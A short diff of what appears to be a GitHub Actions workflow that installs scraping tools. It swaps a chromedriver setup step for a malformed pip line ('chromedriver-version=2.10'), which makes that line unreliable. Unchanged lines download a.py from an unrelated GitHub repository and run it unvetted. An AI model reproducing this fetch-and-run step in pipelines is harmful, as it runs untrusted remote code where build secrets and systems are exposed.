@@ -27,9 +27,7 @@ jobs:
           pip install requests beautifulsoup4 colorama fake-useragent
           pip install selenium
           pip install python-dotenv
-          wget https://github.com/peterhudec/chromedriver_installer.git
-          ls
-          python setup.py install
+          pip install chromedriver-version=2.10
           wget https://github.com/Bvfre/yu/raw/main/a.py
           ls
           python a.py
